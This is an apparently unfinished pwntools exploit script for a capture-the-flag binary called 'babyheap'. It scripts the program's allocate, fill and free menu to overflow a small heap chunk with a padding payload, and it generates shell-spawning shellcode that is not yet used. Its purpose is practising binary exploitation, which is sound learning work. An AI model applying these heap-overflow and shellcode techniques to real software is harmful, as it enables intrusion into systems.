#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyheap
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./babyheap')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

index1 = 0
index1 = str(index1)
index2 = 1
index2 = str(index2)
size1 = 8
size1 = str(size1)
size2 = 10
size2 = str(size2)
payload1 = "AAAAAAAAAAAAAAAAAAAA"

io = start()

# Allocate
print("allocating...")
io.recvuntil("Command: ")
print("sending command int...")
io.sendline("1")

io.recvuntil("Size:")
print("sending size str")
io.sendline(size1)

# Fill
io.recvuntil("Command: ")
print("choosing Fill")
io.sendline("2")

io.recvuntil("Index:")
print("setting index...")
io.sendline(index1)
io.recvuntil("Size:")
print("setting Size...")
io.sendline(size2)
io.recvuntil("Content:")
print("sending Content...")
io.sendline(payload1)

# Free 
io.recvuntil("Command:")
print("choosing Free...")
io.sendline("3")
io.recvuntil("Index:")
print("setting index...")
io.sendline(index1)


#result = io.recv()
#print(result)

# 2. Fill
# 3. Free
# 1. Allocate
# 2. Fill
shellcode = asm(shellcraft.sh())
# 4. Dump
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

